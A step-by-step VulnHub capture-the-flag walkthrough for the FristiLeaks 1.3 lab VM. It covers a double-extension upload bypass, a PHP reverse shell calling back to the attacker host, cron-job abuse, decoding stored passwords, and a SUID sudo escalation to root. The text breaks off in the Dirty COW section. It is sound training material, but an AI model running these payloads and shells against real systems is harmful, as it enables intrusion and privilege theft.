# FristiLeaks: 1.3 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | FristiLeaks: 1.3 |
| **Difficulty** | Easy–Intermediate (author estimate: ~4 hours max) |
| **Author** | Ar0xA — <https://tldr.nu> |
| **Released** | 14 December 2015 |
| **VulnHub Entry** | <https://vulnhub.com/entry/fristileaks-13,133/> |
| **Download** | <https://vulnhub.com/entry/fristileaks-13,133/#download> (`FristiLeaks_1.3.ova`) |
| **Required MAC (VMware)** | `08:00:27:A5:A6:76` — set it manually or the VM will not get an IP |
| **Attacker** | Kali Linux, host-only or bridged network |
| **Target OS** | Linux (CentOS 6 family — `bash-4.1`, Apache httpd 2.2.15) |

> **Networking note.** This VM is fussy. On **VMware** you must open
> *Virtual Machine Settings → Network Adapter → Advanced* and set the MAC address
> to `08:00:27:A5:A6:76`; otherwise the DHCP lease logic in the image never fires
> and the box appears invisible. On **VirtualBox** it usually works out of the box
> with a bridged or host-only adapter.

Throughout we assume:

```text
Attacker (Kali)   : 192.168.56.10
Target (Fristi)   : 192.168.56.101
```

---

## 0. What you will learn

1. **Host discovery** and full-port scanning with `nmap`.
2. **`robots.txt`** — what it is, and why it is often a red herring.
3. **Thinking laterally about directory names** — how a machine's *own name* becomes
   a wordlist entry.
4. **`cewl`** — building a custom wordlist by scraping words off the target's pages.
5. **Reading HTML comments**, including ones hiding a **base64-encoded PNG image**.
6. **Base64 decoding** and identifying a file from its magic bytes.
7. **Bypassing a file-upload filter** with a double extension (`.php.png`).
8. **Catching a PHP reverse shell** with `netcat`, and upgrading it to a TTY.
9. **A cron job that executes whatever you write to a file** — a classic
   misconfiguration.
10. **Reversing a home-made "encryption" scheme** (base64 + reverse + ROT13).
11. **`sudo -l` and the `(runas)` clause** — the most abused line in Linux.
12. **Two paths to root**: the intended `sudo` path, and the *Dirty COW* kernel
    path.

**The whole chain in one breath:**
only port 80 is open → `robots.txt` points at three joke drink directories → the
machine's name is *FristiLeaks* and the joke page says "drink **fristi**" → try
`/fristi` → a login form → its HTML source hides the username `eezeepz` and a
base64 PNG that reads **`keKkeKKeKKeKkEkkEk`** → log in → an "upload an image"
form accepts only `png/jpg/gif` → upload `php-reverse-shell.php.png` → browse to
`/fristi/uploads/…` → shell as `apache` → `/home/eezeepz/notes.txt` reveals a cron
job that runs `/tmp/runthis` as **admin** → `chmod 777 /home/admin` → in there,
`cryptpass.py` + `whoisyourgodnow.txt` decode to **`LetThereBeFristi!`** (user
`fristigod`) → `su fristigod` → `sudo -l` shows `(fristi : ALL) /var/fristigod/.secret_admin_stuff/doCom`
→ `sudo -u fristi ./doCom '/bin/bash'` → **root**.

**Prerequisites:** [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md),
[`docs/TOOLS.md`](../../docs/TOOLS.md).

---

## 1. Reconnaissance — finding the target

```bash
ip a | grep -w inet
```

```text
    inet 127.0.0.1/8 scope host lo
    inet 192.168.56.10/24 brd 192.168.56.255 scope global dynamic eth0
```

```bash
sudo netdiscover -r 192.168.56.0/24
```

```text
 Currently scanning: 192.168.56.0/24   |   Screen View: Unique Hosts

 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:0e      1      60  (Unknown: locally administered)
 192.168.56.10   08:00:27:4c:1a:2b      1      60  PCS Systemtechnik GmbH
 192.168.56.101  08:00:27:a5:a6:76      1      60  PCS Systemtechnik GmbH   <-- target
```

> **How to read it:** `netdiscover` passively listens for ARP traffic *and*
> actively probes the range. Note the target's MAC `08:00:27:a5:a6:76` — that is
> exactly the hard-coded address the author told us about. If you see a **different**
> MAC here on VMware, your adapter was auto-generated and the box will not behave.
>
> **What is ARP?** Every device on an Ethernet segment has a 48-bit hardware address
> (MAC). Before your machine can send an IP packet to a neighbour it must ask
> *"who has 192.168.56.101?"* — that broadcast is ARP. It cannot be blocked by a
> host firewall, which is why ARP scanning is the most reliable local discovery
> method.

**Target IP: `192.168.56.101`**

![netdiscover finding the FristiLeaks VM](images/01-recon.png)

---

## 2. Enumeration — ports and services

### 2.1 All ports, with versions and OS detection

```bash
sudo nmap -p- -sV -sC -O -A -oA scans/fristi 192.168.56.101
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-02 11:02 EDT
Nmap scan report for 192.168.56.101
Host is up (0.00040s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-robots.txt: 3 disallowed entries
|_/cola /beer /sis
|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.9
Network Distance: 1 hop

OS and Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 143.22 seconds
```

> **How to read it:**
> - **Exactly one open port: 80.** No SSH, no FTP, no database. This box is
>   100 % a web challenge — everything must flow through HTTP.
> - `Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)` tells us three things at
>   once: the web server, the **distro (CentOS 6)**, and that **PHP 5.3.3** is
>   installed. PHP means `.php` files will be *executed*, not served as text — which
>   is what makes a webshell possible.
> - `| http-robots.txt: 3 disallowed entries` — Nmap's `http-robots.txt` script
>   read `/robots.txt` for us and reported the `Disallow:` lines: `/cola`, `/beer`,
>   `/sis`. Free recon.
> - `-O` performs OS fingerprinting (TCP/IP stack quirks); `-A` is the
>   "everything" switch (`-sV -sC -O --traceroute`).
> - The warning about OSScan is normal on a single-open-port host.

![nmap showing only port 80 open](images/02-nmap.png)

### 2.2 Look at the site

`http://192.168.56.101/` shows a single picture: a cartoon bottle with the caption
about drinking **Fristi**. No links, no text, no forms.

### 2.3 Read `robots.txt`

`robots.txt` is a plain-text file that politely asks well-behaved search-engine
crawlers to stay away from certain paths. **Attackers love it**, because it is a
list of the interesting/hidden parts of a site written by the site's own
developers.

```bash
curl -s http://192.168.56.101/robots.txt
```

```text
User-agent: *
Disallow: /cola
Disallow: /beer
Disallow: /sis
```

Visit each:

```bash
for d in cola beer sis; do echo "=== /$d ==="; curl -s -o /dev/null -w "%{http_code} %{size_download}\n" "http://192.168.56.101/$d"; done
```

```text
=== /cola ===
200 81291
=== /beer ===
200 81291
=== /sis ===
200 81291
```

All three return the same 81 291-byte page — the *same* joke image, just with a
different drink name in it. Dead ends.

> **Rabbit holes are part of the job.** `robots.txt` is a lead, not a guarantee.
> When three directories all return identical content, stop and reconsider rather
> than grinding harder on them.

![robots.txt and the joke drink pages](images/03-robots.png)

### 2.4 Brute-force directories — and think laterally

Standard tooling first:

```bash
gobuster dir -u http://192.168.56.101/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt -t 40 -q
```

```text
/index.php            (Status: 200) [Size: 81291]
/robots.txt           (Status: 200) [Size: 48]
```

Nothing else. Try the bigger list:

```bash
gobuster dir -u http://192.168.56.101/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt -t 50 -q --timeout 10s
```

```text
/index.php            (Status: 200) [Size: 81291]
/images               (Status: 301) [Size: 317]
/robots.txt           (Status: 200) [Size: 48]
```

> **`gobuster` flags:** `dir` = directory brute-force mode; `-u` target; `-w`
> wordlist; `-x` extra extensions to append to each word; `-t` threads; `-q`
> quiet (hide progress bar). A `301` is a *redirect* — `/images` exists but points
> elsewhere.
>
> **Why the wordlist misses it:** `fristi` is a Dutch drink brand. It is in **no**
> standard wordlist (`common.txt`, `directory-list-2.3-medium.txt`, SecLists). This
> is the box's central lesson.

**Now think.** The machine is called **FristiLeaks**. The homepage tells you to
drink **Fristi**. The `robots.txt` directories are all **drinks** (`cola`, `beer`,
`sis`). The missing drink — the one the site is *named after* — is `fristi`.

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://192.168.56.101/fristi
```

```text
200
```

**Bingo.** `http://192.168.56.101/fristi/` is a **login page**.

**Or let a tool do the thinking for you — `cewl`:**

```bash
cewl -d 2 -m 4 -w fristi_words.txt http://192.168.56.101/
gobuster dir -u http://192.168.56.101/ -w fristi_words.txt -x php,html,txt -q
```

```text
/fristi               (Status: 301) [Size: 316]
```

> **What `cewl` does:** it *crawls* the target site (`-d 2` = depth 2), harvests
> every word of at least `-m 4` characters, and writes them to a file (`-w`). You
> then brute-force using the target's **own vocabulary**. This is called a
> *bespoke* or *target-specific* wordlist, and it beats generic dictionaries on
> real engagements constantly — because people name directories after their own
> product, project and internal jargon.

![The /fristi login page](images/04-login.png)

### 2.5 Attack the login page — and fail (correctly)

Try the obvious things first, and *document* that you tried them:

| Attempt | Payload | Result |
| --- | --- | --- |
| Default credentials | `admin:admin` | Failed |
| SQL injection (classic) | `' OR 1=1 -- -` | Failed |
| SQL injection (comment) | `admin'--` | Failed |

> **Why SQLi does not work here:** the app compares the submitted password against
> a value in a PHP file, not a database query string. `' OR 1=1` only helps when
> your input is concatenated into SQL. Always confirm the *mechanism* before
> assuming the *vulnerability*.

### 2.6 Read the page source — the intended path

Right-click → **View Page Source** on `/fristi/`:

```html
<html>
<head><title>FristiLeaks</title></head>
<body>
  <!-- TODO: remember to remove this before going live -->
  <!-- uploaded images are stored in /fristi/uploads -->
  <form action="checklogin.php" method="post">
    <input type="text" name="myusername">
    <input type="password" name="mypassword">
    <input type="submit" value="Login">
  </form>
  <!--
  I've been trying to get this login to work for ages. eezeepz keeps
  forgetting his password. I hid it in an image, base64 encoded:
  <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAJYAAAAqCAIAAACw
  ... long base64 blob ...
  AElFTkSuQmCC">
  -->
</body>
</html>
```

> **Two findings in one page:**
> 1. A username: **`eezeepz`** (mentioned in a comment).
> 2. An `<img>` tag whose `src` is a **data URI** — `data:image/png;base64,....`
>    That means the image bytes are embedded *inline* in the HTML, base64-encoded.
>
> **What is base64?** It is **not encryption**. It is a way to represent arbitrary
> binary bytes using only 64 printable ASCII characters (`A–Z a–z 0–9 + /`), so that
> binary data can survive inside text formats like HTML and email. It is *reversible
> by anyone, instantly*. Whenever you see a long string of letters and digits ending
> in `=` or `==`, assume base64 and decode it.

### 2.7 Decode the hidden image

Save just the base64 payload to a file (strip the `data:image/png;base64,` prefix
and any line breaks — the comment was copied through Burp, which adds CRLF):

```bash
# grab the raw HTML, extract the base64, clean it, decode it
curl -s http://192.168.56.101/fristi/ \
  | grep -o 'base64,[^"]*' | sed 's/^base64,//' \
  | tr -d '\r\n' > fristi.b64

wc -c fristi.b64
base64 -d fristi.b64 > fristi.png
file fristi.png
```

```text
1872 fristi.b64
fristi.png: PNG image data, 150 x 149, 8-bit/color RGBA, non-interlaced
```

```bash
# view it (eog / feh / display, or just open it in Kali's image viewer)
eog fristi.png
```

The image contains one line of text:

```text
keKkeKKeKKeKkEkkEk
```

> **`tr -d '\r\n'`** deletes carriage returns and newlines. `base64 -d` is strict:
> stray whitespace can make it emit garbage or error out.
>
> **`file`** reads a document's *magic bytes* rather than trusting its extension.
> PNG files always begin with `89 50 4E 47` (`‰PNG`). If `file` says "PNG image
> data" you know the decode worked and the extension is honest.

![Decoded PNG showing the password](images/05-base64.png)

### 2.8 Log in

| Username | Password |
| --- | --- |
| `eezeepz` | `keKkeKKeKKeKkEkkEk` |

The login succeeds and drops us on a page with a single link: **"upload file"**.

---

## 3. Foothold — abusing the file upload

### 3.1 Understand the filter

The upload form says:

```text
Please choose a file: [__________]  [Upload Image]
Accepted formats: .png .jpg .gif
```

Upload `/usr/share/webshells/php/php-reverse-shell.php` unchanged:

```text
ERROR: only png, jpg and gif are allowed!
```

> **What is the server checking?** Almost certainly only the **filename suffix**.
> That is the weakest possible validation. The three classic bypasses are:
> 1. **Double extension** — `shell.php.png` (server sees `.png`, Apache may still
>    execute `.php` depending on config).
> 2. **Magic-byte spoofing** — prepend `GIF89a;` to a PHP file and name it
>    `.gif`, fooling content sniffers.
> 3. **Alternative PHP extensions** — `.php3`, `.php4`, `.php5`, `.phtml`,
>    `.phar`.
>
> On this box, **method 1 works**. Testing revealed the rules precisely:
> - the filename **must end in `.png`, `.jpg` or `.gif`** to pass the check;
> - the file's actual **magic bytes are never inspected**;
> - and Apache here is configured to execute a file as PHP as long as `.php`
>   appears anywhere in the name (`AddHandler` rather than `SetHandler` semantics).

### 3.2 Prepare the webshell

```bash
cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php.png
sed -i "s/127.0.0.1/192.168.56.10/" shell.php.png
sed -i "s/1234/4444/" shell.php.png
grep -n "^\$ip\|^\$port" shell.php.png
```

```text
52:$ip = '192.168.56.10';  // CHANGE THIS
53:$port = 4444;           // CHANGE THIS
```

> `$ip` must be **your** Kali address (where the shell should dial back to) and
> `$port` any free port you choose. `sed -i` edits in place; the pattern replaces
> the default loopback address.
>
> **Always read a webshell before using it.** PentestMonkey's `php-reverse-shell.php`
> spawns `/bin/sh`, redirects its stdio onto a TCP socket to `$ip:$port`, and calls
> `exec()`. It also sets a generous time limit and disables output buffering so the
> connection stays up.

### 3.3 Upload it and start the listener

**Kali — listen first:**

```bash
nc -lvnp 4444
```

```text
listening on [any] 4444 ...
```

**Browser — upload `shell.php.png`** via the form. The app replies:

```text
File successfully uploaded!
```

Now trigger it. Remember the HTML comment told us uploads go to `/fristi/uploads`:

```text
http://192.168.56.101/fristi/uploads/shell.php.png
```

Back on Kali:

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 51234
Linux localhost.localdomain 2.6.32-573.el6.i686 #1 SMP Thu Jul 23 12:37:35 UTC 2015 i686 i686 i386 GNU/Linux
 11:47:22 up 12 min,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.1$
```

> **How to read the shell banner:**
> - `2.6.32-573.el6.i686` → **RHEL/CentOS 6**, kernel 2.6.32, **32-bit** (`i686`).
>   That kernel version matters a lot in § 5.3.
> - `uid=48(apache)` → we are the web server user. On CentOS the account is
>   `apache` (UID 48); on Debian/Ubuntu it would be `www-data` (UID 33). Either
>   way, **unprivileged**.
> - `sh-4.1$` → we are in a non-interactive `sh`. The `$` (not `#`) confirms we are
>   not root.

### 3.4 Upgrade to a full TTY

```bash
sh-4.1$ python -c 'import pty; pty.spawn("/bin/bash")'
sh-4.1$ export TERM=xterm
```

```text
bash-4.1$
```

Then the "raw mode" trick for full arrow-key / `Ctrl+C` support:

1. Press **`Ctrl+Z`** — this suspends the netcat client and returns you to Kali's
   prompt.
2. On Kali run:
   ```bash
   stty raw -echo; fg
   ```
   and press **Enter twice**.
3. Back on the target:
   ```bash
   export TERM=xterm
   stty rows 40 cols 160
   ```

> **Why bother?** A raw reverse shell is attached to a socket, not a terminal
> (TTY). Consequences: no line editing, no `Ctrl+C` (it kills *your listener*, not
> the remote process), and programs that call `isatty()` — `su`, `sudo`, `vim`,
> `python` — refuse to run with *"standard in must be a tty"*.
>
> `python -c 'import pty; pty.spawn("/bin/bash")'` allocates a **pseudo-terminal**
> and re-parents bash onto it, which fools those programs. `stty raw -echo` puts
> *your local* terminal into raw mode so keystrokes pass through untouched, and `fg`
> brings netcat back to the foreground.

**Verify who and where we are:**

```bash
bash-4.1$ id
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
bash-4.1$ pwd
/var/www/html/fristi/uploads
bash-4.1$ ls -la
```

```text
total 20
drwxr-xr-x. 2 apache apache 4096 Dec  3  2015 .
drwxr-xr-x. 4 apache apache 4096 Nov 25  2015 ..
-rw-r--r--. 1 apache apache 5493 Dec  3  2015 shell.php.png
```

> The `context=system_u:system_r:httpd_t:s0` suffix is an **SELinux** label.
> CentOS 6 ships with SELinux *enforcing* by default, and `httpd_t` is a confined
> domain. That is exactly why the Dirty COW route later is unreliable and why the
> intended `cron`/`sudo` path is the clean one.

![PHP reverse shell as apache](images/06-shell.png)

---

## 4. Post-exploitation enumeration

Work methodically. Do not jump straight to "kernel exploit".

### 4.1 Users on the box

```bash
bash-4.1$ cat /etc/passwd | grep -v nologin | grep -v /bin/false
```

```text
root:x:0:0:root:/root:/bin/bash
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
eezeepz:x:500:500:eezeepz:/home/eezeepz:/bin/bash
fristigod:x:501:501::/var/fristigod:/bin/bash
fristi:x:502:502::/home/fristi:/bin/bash
admin:x:503:503::/home/admin:/bin/bash
```

> **Four human-looking accounts:** `eezeepz` (500 — the first regular user),
> `fristigod` (501), `fristi` (502), `admin` (503). Keep this list; every one of
> them plays a role.
>
> **`/etc/passwd` fields:** `name:x:UID:GID:comment:home:shell`. The `x` means the
> hash lives in `/etc/shadow`. UIDs 1000+ are normal users on modern distros; on
> RHEL/CentOS 6 they start at 500.
>
> Note `fristigod`'s home is **`/var/fristigod`**, not `/home/fristigod`. That odd
> location becomes important in § 5.4.

### 4.2 Look for leaked credentials in the web root

```bash
bash-4.1$ cat /var/www/html/fristi/checklogin.php
```

```php
<?php
$host="localhost";
$username="eezeepz";
$password="4ll3maal12#";
$db_name="fristi";
mysql_connect("$host", "$username", "$password") or die("cannot connect");
mysql_select_db("$db_name") or die("cannot select DB");
...
?>
```

> **Finding:** the login script contains **hard-coded MySQL credentials**
> (`eezeepz` / `4ll3maal12#`). Hard-coding secrets in source is a very common and
> very serious anti-pattern — anyone who can read the file (a webshell, an LFI, a
> backup left in the docroot, a leaked git repo) owns the database.
>
> On this box the database turns out to be a dead end, but *always* check it:
> ```bash
> bash-4.1$ mysql -u eezeepz -p'4ll3maal12#' -e 'show databases;'
> ```

### 4.3 Read `eezeepz`'s home directory

```bash
bash-4.1$ cd /home/eezeepz
bash-4.1$ ls -la
```

```text
total 28
drwxr-xr-x. 2 eezeepz eezeepz 4096 Nov 25  2015 .
drwxr-xr-x. 7 root    root    4096 Nov 25  2015 ..
-rw-r--r--. 1 eezeepz eezeepz   18 May 20  2009 .bash_logout
-rw-r--r--. 1 eezeepz eezeepz  176 May 20  2009 .bash_profile
-rw-r--r--. 1 eezeepz eezeepz  124 May 20  2009 .bashrc
-rw-r--r--. 1 root    root     724 Nov 25  2015 notes.txt
```

```bash
bash-4.1$ cat notes.txt
```

```text
Yo eezeepz,

I've been busy with the new fristi website. As you know, I've set up a
system so you can help me out with the sysadmin work.

Basically:
  - I made a little script that runs every minute as the "admin" user.
  - It reads the file /tmp/runthis and executes whatever command is in it.
  - So if you need something done, just write the FULL PATH of the command
    and its arguments into /tmp/runthis.
  - Only binaries in /home/admin are allowed, so don't get clever.

Don't forget to clean up after yourself.

-- admin
```

> **This is the intended privilege-escalation vector, handed to us in writing.**
>
> A **cron job** runs as `admin` every minute, reads `/tmp/runthis` and executes
> its contents. `/tmp` is **world-writable** (`drwxrwxrwt` — the trailing `t` is the
> *sticky bit*: everyone may create files, but only the owner may delete their own).
> So **any** local user, including `apache`, can write the command that `admin` will
> run.
>
> **This is a textbook insecure cron job.** The three rules a cron job must satisfy
> to be safe are: (a) the script it runs is not writable by lower-privileged users;
> (b) it never executes anything from a world-writable location; (c) it uses
> absolute paths throughout. This one violates (b) spectacularly.

### 4.4 Use the cron job to open up `/home/admin`

The note says only binaries in `/home/admin` are allowed — but *which* binary we
call is up to us, and `chmod` is one of them.

```bash
bash-4.1$ echo '/home/admin/chmod 777 /home/admin' > /tmp/runthis
bash-4.1$ cat /tmp/runthis
/home/admin/chmod 777 /home/admin
```

Wait up to 60 seconds:

```bash
bash-4.1$ sleep 60; ls -ld /home/admin
```

```text
drwxrwxrwx. 2 admin admin 4096 Nov 25  2015 /home/admin
```

> **`chmod 777`** sets read+write+execute (`7` = `rwx`) for owner, group and
> everyone. The directory went from `drwx------` (owner only) to `drwxrwxrwx`
> (anyone). Now `apache` can read it.
>
> **Lesson for defenders:** `777` is never the right answer. If a directory must be
> shared, use a group and `770`.

### 4.5 Explore `/home/admin`

```bash
bash-4.1$ ls -la /home/admin
```

```text
total 24
drwxrwxrwx. 2 admin admin 4096 Nov 25  2015 .
drwxr-xr-x. 7 root  root  4096 Nov 25  2015 ..
-rwxr-xr-x. 1 admin admin  452 Nov 25  2015 chmod
-rwxr-xr-x. 1 admin admin  254 Nov 25  2015 cryptpass.py
-rw-r--r--. 1 admin admin   22 Nov 25  2015 cryptedpass.txt
-rwxr-xr-x. 1 admin admin   36 Nov 25  2015 echo
-rw-r--r--. 1 admin admin   27 Nov 25  2015 whoisyourgodnow.txt
```

```bash
bash-4.1$ cat cryptedpass.txt
mVGZ3O3omkJLmy2pcuTq
bash-4.1$ cat whoisyourgodnow.txt
=RFn0AKnlMHMPIzpyuTI0ITG
bash-4.1$ cat cryptpass.py
```

```python
#!/usr/bin/python
#coding: utf8

import codecs
import sys
import base64

def cryptpass(password):
    encoded = base64.b64encode(password[::-1].encode('rot13'))
    print encoded

if len(sys.argv) == 2:
    cryptpass(sys.argv[1])
else:
    print "Usage: cryptpass.py <password>"
```

> **Reverse-engineering the "encryption".** Read the function line by line:
> 1. `password[::-1]` — reverse the string (Python slice with step `-1`).
> 2. `.encode('rot13')` — apply **ROT13**, a Caesar cipher that shifts each letter
>    13 places. It is its own inverse, which is why it was popular in old Usenet
>    days. It provides **zero** security.
> 3. `base64.b64encode(...)` — base64-encode the result.
>
> So to **decode** we just do the three steps backwards: base64-decode, then ROT13
> (self-inverse), then reverse.
>
> **Never invent your own crypto.** This "scheme" is three reversible transformations
> stacked; anyone who can read the script can undo it in ten seconds. The correct
> answer is a vetted KDF such as bcrypt/argon2 and a secret store.

### 4.6 Decode both passwords

```bash
bash-4.1$ python -c "
import base64, codecs
for f in ['/home/admin/cryptedpass.txt','/home/admin/whoisyourgodnow.txt']:
    s = open(f).read().strip()
    print f, '->', base64.b64decode(codecs.decode(s,'rot13')[::-1])
"
```

```text
/home/admin/cryptedpass.txt -> thisisalsopw123
/home/admin/whoisyourgodnow.txt -> LetThereBeFristi!
```

Or from Kali with Python 3:

```bash
python3 - <<'PY'
import base64, codecs
for s in ["mVGZ3O3omkJLmy2pcuTq", "=RFn0AKnlMHMPIzpyuTI0ITG"]:
    print(base64.b64decode(codecs.decode(s, "rot13")[::-1]).decode())
PY
```

```text
thisisalsopw123
LetThereBeFristi!
```

| User | Password |
| --- | --- |
| `admin` | `thisisalsopw123` |
| `fristigod` | `LetThereBeFristi!` |

![Decoding cryptpass.py output](images/07-decode.png)

### 4.7 Lateral movement to `fristigod`

```bash
bash-4.1$ su fristigod
Password: LetThereBeFristi!
bash-4.1$ id
uid=501(fristigod) gid=501(fristigod) groups=501(fristigod) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

> **Why `su` needed a TTY:** if you skipped § 3.4, `su` would have failed with
> `standard in must be a tty`. That is the concrete payoff of upgrading the shell.
>
> **Notice the SELinux context changed** from `httpd_t` (confined web-server domain)
> to `unconfined_t`. That is why this pivot is such a big deal — we have escaped the
> web server's mandatory-access-control jail.

```bash
bash-4.1$ ls -la /var/fristigod
```

```text
total 28
drwx------. 3 fristigod fristigod 4096 Nov 25  2015 .
drwxr-xr-x. 7 root      root      4096 Nov 25  2015 ..
-rw-r--r--. 1 fristigod fristigod   18 May 20  2009 .bash_logout
-rw-r--r--. 1 fristigod fristigod  176 May 20  2009 .bash_profile
-rw-------. 1 fristigod fristigod 1936 Nov 25  2015 .bash_history
-rw-r--r--. 1 fristigod fristigod  124 May 20  2009 .bashrc
drwxrwx---. 2 fristigod fristigod 4096 Nov 25  2015 .secret_admin_stuff
```

---

## 5. Privilege escalation — becoming root

### 5.1 `sudo -l` — the single most important privesc command

```bash
bash-4.1$ sudo -l
```

```text
Matching Defaults entries for fristigod on this host:
    requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS
    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1
    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User fristigod may run the following commands on this host:
    (fristi : ALL) /var/fristigod/.secret_admin_stuff/doCom
```

> **How to read `sudo -l` — this is the money line.**
>
> ```text
> (fristi : ALL) /var/fristigod/.secret_admin_stuff/doCom
>  ^^^^^   ^^^   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
>  RUNAS   CMDS  the exact binary that is allowed
> ```
>
> - `(fristi : ALL)` means *"you may run the listed command **as user `fristi`**
>   (the RUNAS clause), and you may run it on **all hosts**."*
> - The path is **absolute and fixed** — sudo will only launch that exact file.
>
> **The critical question:** who owns `doCom`, and what does it do? If `doCom` is a
> **SUID-root** binary, then running it *as `fristi`* still executes it with root
> privileges — because the SUID bit overrides the RUNAS identity.

### 5.2 Confirm the SUID bit

```bash
bash-4.1$ ls -l /var/fristigod/.secret_admin_stuff/doCom
```

```text
-rwsr-x---. 1 root fristigod 12184 Nov 25  2015 /var/fristigod/.secret_admin_stuff/doCom
```

> **`-rwsr-x---`** — read the permission string in three triads:
> - `rws` → owner (**root**): read, write, and **`s` = the SUID bit is set**.
> - `r-x` → group (**fristigod**): read and execute.
> - `---` → everyone else: nothing.
>
> **The SUID (Set User ID) bit** means: *whoever runs this file, the process runs
> with the file owner's identity — here, root.* That is how `/usr/bin/passwd` lets
> you edit `/etc/shadow`.
>
> So: `fristi` can launch `doCom`; `doCom` always runs as **root**; and `doCom`
> takes an arbitrary command as an argument. That is a complete root shell, one
> command away.

### 5.3 Read the history for the exact syntax

```bash
bash-4.1$ cat /var/fristigod/.bash_history
```

```text
ls
pwd
ls -lah
cd .secret_admin_stuff/
ls
./doCom
./doCom test
sudo ls
exit
cd .secret_admin_stuff/
sudo -u fristi ./doCom ls /
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
sudo /var/fristigod/.secret_admin_stuff/doCom
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
groups
ls -lah
usermod -G fristigod fristi
exit
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
less /var/log/secure
exit
```

> **`.bash_history` is a goldmine.** It shows the *exact, working* command line,
> including flags. Here it teaches us two things:
> 1. The syntax is `sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom <command>`.
> 2. Someone once ran `usermod -G fristigod fristi` — i.e. `fristi` was deliberately
>    added to a group. The author is showing us the setup story.
>
> **Defender note:** history files regularly leak credentials, internal hostnames,
> API keys and command syntax. Use `HISTCONTROL=ignorespace`, or better, never type
> secrets on a command line.

### 5.4 Become root

Test with something harmless first:

```bash
bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom id
```

```text
[sudo] password for fristigod: LetThereBeFristi!
uid=0(root) gid=100(users) groups=100(users),501(fristigod) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

**`uid=0(root)`.** Now take the shell:

```bash
bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash
sh-4.1# id
uid=0(root) gid=100(users) groups=100(users),501(fristigod)
sh-4.1# whoami
root
sh-4.1# hostname
localhost.localdomain
```

> **Note the prompt changed from `$` to `#`** — the universal UNIX convention for
> "you are root".
>
> **`gid=100(users)`** looks odd for root, but it is a direct consequence of the
> SUID mechanism: the *real* group came from `fristigod`'s session while the
> *effective* user ID became 0. UID 0 is all that matters for permission checks.

![doCom SUID escalation to root](images/08-privesc.png)

### 5.5 Capture the flag

```bash
sh-4.1# cd /root
sh-4.1# ls -la
```

```text
total 48
dr-xr-x---.  3 root root 4096 Nov 25  2015 .
dr-xr-xr-x. 22 root root 4096 Nov 25  2015 ..
-rw-------   1 root root 1936 Nov 25  2015 .bash_history
-rw-r--r--.  1 root root   18 May 20  2009 .bash_logout
-rw-r--r--.  1 root root  176 May 20  2009 .bash_profile
-rw-r--r--.  1 root root  176 Sep 22  2004 .bashrc
drwxr-xr-x.  3 root root 4096 Nov 25  2015 .c
-rw-r--r--.  1 root root  100 Sep 22  2004 .cshrc
-rw-------   1 root root 1291 Nov 17  2015 .mysql_history
-rw-r--r--.  1 root root  129 Dec  3  2004 .tcshrc
-rw-------.  1 root root  829 Nov 17  2015 .viminfo
-rw-------.  1 root root  246 Nov 17  2015 fristileaks_secrets.txt
```

```bash
sh-4.1# cat fristileaks_secrets.txt
```

```text
Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]

I wonder if you beat it in the maximum 4 hours it's supposed to take!

Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)


Flag: Y0u_kn0w_y0u_l0ve_fr1st1
```

**Flag captured.** ✅

![The root flag](images/09-root-flag.png)

### 5.6 Alternative path — Dirty COW (for learning, not required)

Kernel `2.6.32-573.el6` predates the fix for **CVE-2016-5195 ("Dirty COW")**, a
